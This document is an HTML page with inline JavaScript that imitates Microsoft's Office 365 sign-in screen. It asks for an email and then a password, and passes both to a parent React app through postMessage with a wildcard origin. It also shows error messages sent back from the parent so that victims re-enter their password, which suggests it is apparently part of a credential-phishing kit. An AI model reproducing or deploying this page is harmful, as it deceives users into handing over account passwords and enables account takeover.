<body>
  <!-- New HTML structure from your provided code -->
  <div class="main-container">
    <div class="form-wrapper">
      <div class="form-box">
        <!-- Email View (div1) -->
        <div id="div1">
          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
          <h1 class="mt-4">Sign in</h1>
          <div id="email_error_container"></div> <!-- Error container -->
          <div class="form-group mt-2">
            <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
          </div>
          <p>No account? <a href="https://signup.live.com/" target="_blank">Create one!</a></p>
          <p><a href="https://account.live.com/password/reset" target="_blank">Can't access your account?</a></p>
          <div class="button-container mt-4">
            <button class="btn btn-primary-blue" id="next">Next</button>
          </div>
        </div>

        <!-- PASSWORD VIEW -->
        <div id="password_view" class="hidden">
          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
          <div style="cursor: pointer; margin-top: 20px; margin-bottom: 10px;" id="back_to_email">
            <i class="fas fa-arrow-left"></i> <span id="display_email" style="margin-left: 8px;"></span>
          </div>
          <h1 class="mt-2">Enter password</h1>
          <div id="password_error_container"></div> <!-- Error container -->
          <div class="form-group mt-2">
            <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
          </div>
          <p><a href="#">Forgot password?</a></p>
          <div class="button-container mt-4">
            <button class="btn btn-primary-blue" id="sign_in">Sign in</button>
          </div>
        </div>
      </div>

      <!-- "Sign-in options" Clickable Box -->
      <div class="options-box" id="options_box">
        <a href="#" id="sign_in_options_link">

    <a href="https://www.microsoft.com/en-us/concern/privacy" target="_blank">...</a>

  <!-- Existing JavaScript Logic - Preserved and Adapted -->
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      // Get all the new HTML elements
      const emailView = document.getElementById('div1');
      const passwordView = document.getElementById('password_view');
      const optionsBox = document.getElementById('options_box');
      const nextBtn = document.getElementById('next');
      const signInBtn = document.getElementById('sign_in');
      const backToEmailBtn = document.getElementById('back_to_email');
      const emailInput = document.getElementById('email');
      const passwordInput = document.getElementById('password');
      const displayEmail = document.getElementById('display_email');
      const passwordErrorContainer = document.getElementById('password_error_container');
      
      let userEmail = '';

      // Listen for error messages from the React parent
      window.addEventListener('message', function (event) {
        if (event.data.type === 'LOGIN_ERROR') {
          const errorMessage = event.data.payload.message;
          // Display the error message in the password view
          passwordErrorContainer.innerHTML = `<div id="error-message-container">${errorMessage}</div>`;
          passwordInput.value = ''; // Clear the password so user can re-enter
          passwordInput.focus();
        }
      });

      // Handle the "Next" button click to go to password view
      nextBtn.addEventListener('click', function () {
        if (emailInput.value.trim() !== '') {
          userEmail = emailInput.value.trim();
          displayEmail.textContent = userEmail; // Set the email for the password view
          emailView.classList.add('hidden');
          optionsBox.classList.add('hidden');
          passwordView.classList.remove('hidden');
          passwordInput.focus();
        } else {
          emailInput.focus();
        }
      });
      
      // Handle the "Back" button click to go back to email view
      backToEmailBtn.addEventListener('click', function() {
        passwordView.classList.add('hidden');
        emailView.classList.remove('hidden');
        optionsBox.classList.remove('hidden');
        passwordInput.value = ''; // Clear password when going back
        passwordErrorContainer.innerHTML = ''; // Clear errors
      });

      // Handle the final "Sign in" button click
      signInBtn.addEventListener('click', function () {
        const password = passwordInput.value.trim();
        passwordErrorContainer.innerHTML = ''; // Clear previous errors
        if (password !== '') {
          // Send the login data to the parent React app
          window.parent.postMessage({
            type: 'OFFICE_365_SUBMIT',
            payload: { email: userEmail, password: password }
          }, '*'); // Use a specific origin in production for security
        } else {
          passwordInput.focus();
        }
      });
    });
  </script>
